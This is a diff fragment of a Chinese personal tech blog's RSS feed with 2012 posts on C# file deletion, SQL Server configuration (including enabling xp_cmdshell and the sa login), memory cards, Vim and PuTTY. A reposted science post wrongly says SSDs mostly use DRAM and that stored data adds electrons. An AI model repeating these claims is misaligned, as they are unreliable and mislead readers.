+      <guid>https://leizhiyuan.github.io/2012/09/24/c#%E5%88%A0%E9%99%A4%E6%96%87%E4%BB%B6%E5%92%8C%E6%96%87%E4%BB%B6%E5%A4%B9%E5%88%B0%E5%9B%9E%E6%94%B6%E7%AB%99/</guid>
+      <description>如果使用C#代码来删除文件或是文件夹。会将文件和文件夹直接删除，而不是删除到回收站。可以调用Microsoft.VisualBasic.dll提供的方法。
+首先对项目添加名为Microsoft.VisualBasic.dll的引用，然后添加命名空间
+using Microsoft.VisualBasic.FileIO; 最后示例代码如下：
+using System; using Microsoft.VisualBasic.FileIO; namespace leaver { class Program { static void Main(string[] args) { Console.WriteLine(&#34;删除文件到回收站&#34;); string filepath = &#34;leaver.txt&#34;; FileSystem.DeleteFile(filepath, UIOption.OnlyErrorDialogs, RecycleOption.SendToRecycleBin); Console.WriteLine(&#34;删除文件完成&#34;); Console.WriteLine(&#34;删除文件夹到回收站&#34;); string dirpath = &#34;leaver&#34;; FileSystem.DeleteDirectory(dirpath, UIOption.OnlyErrorDialogs, RecycleOption.SendToRecycleBin); Console.WriteLine(&#34;删除文件夹完成&#34;); } } } 很简单。。就不多说了。。</description>
+    </item>
+    
+    <item>
+      <title>.net显示网络连接状态图标</title>
+      <link>https://leizhiyuan.github.io/2012/09/24/.net%E6%98%BE%E7%A4%BA%E7%BD%91%E7%BB%9C%E8%BF%9E%E6%8E%A5%E7%8A%B6%E6%80%81%E5%9B%BE%E6%A0%87/</link>
+      <pubDate>Mon, 24 Sep 2012 08:04:02 +0000</pubDate>
+      
+      <guid>https://leizhiyuan.github.io/2012/09/24/.net%E6%98%BE%E7%A4%BA%E7%BD%91%E7%BB%9C%E8%BF%9E%E6%8E%A5%E7%8A%B6%E6%80%81%E5%9B%BE%E6%A0%87/</guid>
+      <description>效果图： 
+介绍 　越来越多的软件要通过连接互联网来执行一些业务层的业务操作，比如调用web services服务，获取数据等等。 通常你可能希望知道当前你的网络连接是不是真的连上了，当然有很多种方法可以做到，比如，你可以查看System.Net 命名空间中的NetworkInterface 的状态，但是有这以太网连接并不表示你的连接真的可以用。 本文将会展示一种方法，该方法在程序的状态栏StatusStrip 显示一个简单的图标来指示是不是真的连接到了互联网。
+使用代码 　最简单的我们会想到使用一个Timer来进行http-get请求来判断一个特定的网页是否可用。
+　当然这种方法下，我们最应该考虑的就是请求不能阻塞UI线程，因此，我将使用一个BackgroundWorker 对象来进行get请求，BackgroundWorker 对象声明了DoWork方法。该方法定义了一个事件句柄，该句柄传递一个DoWorkEventArgs 类来将事件的处理结果返回到UI线程，因此，你不必与任何的UI元素进行交互，因为它运行在一个独立的线程里。
+private void InitializeComponent() { // Background Worker this._worker = new BackgroundWorker(); this._worker.WorkerReportsProgress = false; this._worker.WorkerSupportsCancellation = false; this._worker.DoWork += new DoWorkEventHandler(this.BackgroundWorker_DoWork); this._worker.RunWorkerCompleted += new RunWorkerCompletedEventHandler(this.BackgroundWorker_RunWorkerCompleted); // Timer this._updateTimer = new Timer(); this._updateTimer.Enabled = !this.DesignMode; // Enabled when not in design mode this._updateTimer.Tick += delegate { this.OnTick(); }; } private void OnTick() { if (this.</description>
+    </item>
+    
+    <item>
+      <title>SqlServer 2008开启远程连接</title>
+      <link>https://leizhiyuan.github.io/2012/08/20/sqlserver-2008%E5%BC%80%E5%90%AF%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5/</link>
+      <pubDate>Mon, 20 Aug 2012 02:48:22 +0000</pubDate>
+      
+      <guid>https://leizhiyuan.github.io/2012/08/20/sqlserver-2008%E5%BC%80%E5%90%AF%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5/</guid>
+      <description>对于需要外部访问数据库的操作，需要开启sql server的远程连接。没经验的我等Google之。。大部分操作按照SQL Server 2008 R2如何开启数据库的远程连接来操作
+　但是。有一些很小的细节需要注意。我的数据库是Sql Server 2008 Express版。这个是VS自带的。为了管理方便，可以安装SQL Server® 2008 Management Studio Express 安装过程不多说。安装完成后，直接打开
+　
+　服务器名称默认是空的。。“.”好像是不行的，这时候点击右边箭头。更多，本地和远程服务器。在远程服务器里可以找到。点击就可以了。
+　我按照文章改完。sa还是登不上。。然后又试了一些
+　
+　如上图右键sa，属性，常规里设置sa密码。不要太简单。状态里的登录选项设为启用。ok。。我碰上的问题就这几个。</description>
+    </item>
+    
+    <item>
+      <title>SQLServer启用xp_cmdshell</title>
+      <link>https://leizhiyuan.github.io/2012/07/11/sqlserver%E5%90%AF%E7%94%A8xp_cmdshell/</link>
+      <pubDate>Wed, 11 Jul 2012 14:20:21 +0000</pubDate>
+      
+      <guid>https://leizhiyuan.github.io/2012/07/11/sqlserver%E5%90%AF%E7%94%A8xp_cmdshell/</guid>
+      <description>忘了当时是执行哪条命令的时候需要启动xp_cmdshell了。。反正是必须用的。。
+默认情况下,sql server安装完后,xp_cmdshell是禁用的(可能是安全考虑),如果要使用它,可按以下步骤 &amp;ndash; 允许配置高级选项 EXEC sp_configure &amp;lsquo;show advanced options&amp;rsquo;, 1 GO &amp;ndash; 重新配置 RECONFIGURE GO &amp;ndash; 启用xp_cmdshell EXEC sp_configure &amp;lsquo;xp_cmdshell&amp;rsquo;, 1 GO &amp;ndash;重新配置 RECONFIGURE GO
+&amp;ndash;执行想要的xp_cmdshell语句 Exec xp_cmdshell &amp;lsquo;query user&amp;rsquo; GO
+&amp;ndash;用完后,要记得将xp_cmdshell禁用(出于安全考虑) &amp;ndash; 允许配置高级选项 EXEC sp_configure &amp;lsquo;show advanced options&amp;rsquo;, 1 GO &amp;ndash; 重新配置 RECONFIGURE GO &amp;ndash; 禁用xp_cmdshell EXEC sp_configure &amp;lsquo;xp_cmdshell&amp;rsquo;, 0 GO &amp;ndash;重新配置 RECONFIGURE GO &amp;nbsp;</description>
+    </item>
+    
+    <item>
+      <title>各种内存卡介绍</title>
+      <link>https://leizhiyuan.github.io/2012/06/30/%E5%90%84%E7%A7%8D%E5%86%85%E5%AD%98%E5%8D%A1%E4%BB%8B%E7%BB%8D/</link>
+      <pubDate>Sat, 30 Jun 2012 10:50:19 +0000</pubDate>
+      
+      <guid>https://leizhiyuan.github.io/2012/06/30/%E5%90%84%E7%A7%8D%E5%86%85%E5%AD%98%E5%8D%A1%E4%BB%8B%E7%BB%8D/</guid>
+      <description>闪存卡（Flash Card）是利用闪存（Flash Memory）技术达到存储电子信息的存储器，一般应用在数码相机，掌上电脑，MP3等小型数码产品中作为存储介质，所以样子小巧，有如一张卡片，所以称之为闪存卡。 根据不同的生产厂商和不同的应用，闪存卡大概有Compact Flash（CF卡）、MultiMediaCard（MMC卡）、Secure Digital（SD卡）、Memory Stick（记忆棒）等。
+SD卡  SD卡全称为Secure Digital卡，SD卡标准的面世相对而言比CF要晚，根据MMC为基础所开发的Secure Digital（SD），其改进主要是在增添了版权保护的功能，提高了传输速度和增加了写保护机制等，其主要引脚的定义与MMC卡并没有太大的区别。SD具有较高的兼容性，较小的体积和不错的数据传输速度，成为了当今的时尚数码相机和部分可拍照手机的标准配置。SD接口是当今世界上被采用得最多的闪存卡接口，市面上主流的PDA，数码相机，MP3的闪存卡，烧录卡接口大多为SD卡，也使SD卡取代了CF卡成为了当今最常见得存储卡。如图： 
+ MiniSD  MiniSD是SD卡的一大改进，体积只有21.5x20x1.4mm，比普通SD卡足足节省了60%的空间，通过转接卡还能保证MiniSD在正常的SD插槽上的使用。如图： 
+ Micro SD(TF卡)  TF卡又称T-Flash卡，也叫Micro SD卡,体积只有11×15×1mm，面积为MiniSD的一半 
+ MMC卡  MMC卡全称为Multi Media Card，由SanDisk与Siemens AG/InfineonTechnologies AG所联合开发，且于1997年11月发表，Size：24mm x 32mm x 1.4mm，重量2g。MMC卡的兼容性方面不及SD卡的好，数据传输速度受到硬件的限制，不适合作高速的数据传输。如图： 
+ RSMMC  RSMMC是Reduced-Size MMC的缩写，小型化的MMC卡，传说专门为智能手机设置。改良后的产品叫做MMCmobile 
+ 什么是CF卡？  CF格式由来已久，被SanDisk公司在1994年首次制造出来。CF卡的全称是Compact Flash，Compact意指“小型的，轻便的”，CF大小为43mm x 36mm x 3.3mm，50 Pins。如图 
+ MS卡  Memory Stick，索尼推出的存储产品。貌似是独树一帜，不多介绍。 参考：
+ http://www.allmemorycards.com/sd.htm
+http://baike.baidu.com/view/26952.htm
+http://nds.cngba.com/nds_bd/2007122122100.shtml</description>
+    </item>
+    
+    <item>
+      <title>U盘或硬盘装满资料后，质量会增加吗？</title>
+      <link>https://leizhiyuan.github.io/2012/06/22/u%E7%9B%98%E6%88%96%E7%A1%AC%E7%9B%98%E8%A3%85%E6%BB%A1%E8%B5%84%E6%96%99%E5%90%8E%E8%B4%A8%E9%87%8F%E4%BC%9A%E5%A2%9E%E5%8A%A0%E5%90%97/</link>
+      <pubDate>Fri, 22 Jun 2012 14:11:49 +0000</pubDate>
+      
+      <guid>https://leizhiyuan.github.io/2012/06/22/u%E7%9B%98%E6%88%96%E7%A1%AC%E7%9B%98%E8%A3%85%E6%BB%A1%E8%B5%84%E6%96%99%E5%90%8E%E8%B4%A8%E9%87%8F%E4%BC%9A%E5%A2%9E%E5%8A%A0%E5%90%97/</guid>
+      <description>科普文，以前看到过，今天又想起来了，所以拿来和大家分享，感谢原作者的努力。
+　U盘或硬盘装满资料后，质量会增加吗？
+　要回答这个问题，先让我们看看U盘和硬盘的存储原理。
+　U盘又称为闪存(Flash Memory)，其存储介质为flash，简单地说，flash是用浮栅来存储数据的，浮栅就是可以存储电荷的电荷势阱，向flash写入数据的过程就是向这个电荷势阱注入电荷的过程。
+　至于硬盘，如今使用较多的是固态硬盘，其存储介质多为DRAM，简单来说，DRAM是用电容来存取数据的，电容可以充放电，可以储能，有电荷的时候是&amp;rdquo;1&amp;rdquo;，无电荷的时候是&amp;rdquo;0&amp;rdquo;。
+　回到开头的问题，通过上面的分析可以发现，U盘或硬盘装满资料前后，改变的是数字讯号记录的内容，也就是说多了许多电子。
+　电子的质量约为9.10938188E-31 kg，所以说，U盘或硬盘装满资料后，质量是会增加的，只不过增加的量非常的少。
+　同样，我们可以思考这样的问题，每比特的数据有多重？
+　众所周知，计算机使用一串串二进制的&amp;rdquo;1&amp;rdquo;和&amp;rdquo;0&amp;rdquo;表示所有种类的信息———电子邮件、文档、视频、网页，一切的一切。
+　我们拿普通电脑的存储器来说，其存储机制就是刚刚提到的DRAM，电容充电后代表&amp;rdquo;1&amp;rdquo;，没充电就代表&amp;rdquo;0&amp;rdquo;。比特&amp;rdquo;0&amp;rdquo;的数据是没有电子的，也就是没有质量的，而比特&amp;rdquo;1&amp;rdquo;的数据是有质量的，虽然轻得微不足道。
+　具体是多少，需要考虑存储器的电容器，估计的值是每个电容器只需要4万个电子就能充满，4万个电子的质量就是3.6E-26 kg，也就是说，比特&amp;rdquo;1&amp;rdquo;的数据质量是3.6E-26 kg。
+　最后，让我们计算一下全球互联网信息总重量！
+　要想得出这个结果，我们需要的数据是互联网上流动的信息总量，这可以从克利福德·霍利迪的著作《互联网发展2006》中找到答案：这个总流量就是……大得令人吃惊的40P字节，即4E16字节———4后面跟着16个0。
+　并不是所有的比特都是&amp;rdquo;1&amp;rdquo;，要不然网络的内容也太无趣了，平均大约有一半的比特是&amp;rdquo;1&amp;rdquo;，另一半是&amp;rdquo;0&amp;rdquo;，也就是有20P的比特&amp;rdquo;1&amp;rdquo;，套用我们计算的比特&amp;rdquo;1&amp;rdquo;数据重量时的公式，于是得到了总数7.2E-9 kg。
+　在遭罪地写了这么多字之后，我们终于得出了结论：互联网的重量全部加起来大约只有1盎司(1盎司约等于28克)的五百万分之一。
+　原文:http://www.cnblogs.com/jyaray/archive/2010/12/09/1901610.html</description>
+    </item>
+    
+    <item>
+      <title>windows下vim闪烁问题</title>
+      <link>https://leizhiyuan.github.io/2012/05/07/windows%E4%B8%8Bvim%E9%97%AA%E7%83%81%E9%97%AE%E9%A2%98/</link>
+      <pubDate>Mon, 07 May 2012 19:21:59 +0000</pubDate>
+      
+      <guid>https://leizhiyuan.github.io/2012/05/07/windows%E4%B8%8Bvim%E9%97%AA%E7%83%81%E9%97%AE%E9%A2%98/</guid>
+      <description>今天打开我的vim才发现，界面隔几秒会闪烁。虽说貌似能够起到防止眼睛疲劳的效果，但我实在是hold不住啊。不行，搜索。。 首先有这个问题的人不多。首先找到了这篇文章，但是作者不知道怎么想的。只说了原因，没有给出解决方法。继续搜索关键字cursorcolumn，结果找到了这篇文章，按着说明来了一下 set cursorline cursorcolumn 没效果。依然闪烁。 好吧。如果是插件的问题。于是我删掉了所有的插件包括写入的配置。依然不行。于是还是采用排除法，一行行删掉配置文件。最后定位到 set guifont=Arial_monospaced_for_SAP:h9:cANSI  这是设置字体的，不太明白为什么会出现这样的情况。怀疑是字体的原因，于是换个字体，依然闪烁。。好吧。就这样吧。删掉算了。</description>
+    </item>
+    
+    <item>
+      <title>Win7使用Putty连接VitualBox下的Ubuntu</title>
+      <link>https://leizhiyuan.github.io/2012/04/26/win7%E4%BD%BF%E7%94%A8putty%E8%BF%9E%E6%8E%A5vitualbox%E4%B8%8B%E7%9A%84ubuntu/</link>
+      <pubDate>Thu, 26 Apr 2012 22:40:27 +0000</pubDate>
+      
+      <guid>https://leizhiyuan.github.io/2012/04/26/win7%E4%BD%BF%E7%94%A8putty%E8%BF%9E%E6%8E%A5vitualbox%E4%B8%8B%E7%9A%84ubuntu/</guid>
+      <description>推荐连接方式选择Host-only Adapter（主机模式）。设置方法是打开vitualbox，然后选中虚拟机，点击设置，找到网络，然后如下图选择
+
+设置完成后，启动ubuntu，然后执行 ifconfig -a 找到下面这行，可以看到虚拟机分配到的ip地址为192.168.56.101
+
+然后呢，可以在win7的cmd下 ping 192.168.56.101，看看可不可以ping通，
+
+有返回所以是通的，
+然后在ubuntu下需要执行 sudo apt-get install openssh-server Ubuntu缺省安装了openssh-client（用于ubuntu连接其他服务器）,所以在这里就不安装了，只安装server，用于其它电脑连接ubuntu，如果你的系统没有安装的话，再用apt-get安装上即可。
+然后确认sshserver是否启动了： ps -e |grep ssh 如果只有ssh-agent行那ssh-server还没有启动，需要执行 service sshd start ，启动ssh服务器 如果看到sshd那说明ssh-server已经启动了。
+然后下载putty，推荐去官方下载，下载完成后发现是单文件，直接执行即可。
+输入ubuntu的ip点击open即可
+
+登录上以后执行命令会发现有乱码，鼠标右键点击putty窗口的标题栏，选择，&amp;rdquo;Change Settings&amp;rdquo;，&amp;rdquo;Translation&amp;rdquo;，在&amp;rdquo;Received data assumed to be in which character set&amp;rdquo;的下拉菜单里选择&amp;rdquo;UTF-8&amp;rdquo;。如下图
+
+这样，下次又得重复同样的工作，为了保持配置，继续在上图选择左边的session
+
+在saved session输入个名字，save即可，下次直接连这个就可以了
+参考：http://www.linuxidc.com/Linux/2011-12&amp;frasl;49325.htm
+http://spark10000.blog.51cto.com/955100/547211
+至于putty的使用不在本文的计划范围内，以后有机会再写吧。
+每次遇到问题就体会到网络的信息实在太杂了。掌握搜索技术和对数据的快速筛选很重要。
+&amp;nbsp;</description>
+    </item>
+    
+  </channel>
+</rss>
